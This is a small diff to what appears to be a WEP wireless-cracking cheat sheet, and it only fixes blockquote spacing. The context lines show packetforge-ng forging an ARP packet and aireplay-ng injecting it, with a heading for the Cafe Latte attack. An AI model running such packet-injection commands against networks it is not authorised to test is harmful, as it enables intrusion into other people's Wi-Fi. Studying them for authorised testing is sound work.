@@ -165,7 +165,7 @@ packetforge-ng -0 -a $bssid -h $client_mac -k 255.255.255.255 -l 255.255.255.255
 aireplay-ng -2 -r forged.cap $interface
 ```
 
->If you used fake authentication, replace `$client_mac` with `$our_mac`.
+> If you used fake authentication, replace `$client_mac` with `$our_mac`.
 
 ### Cafe Latte
 
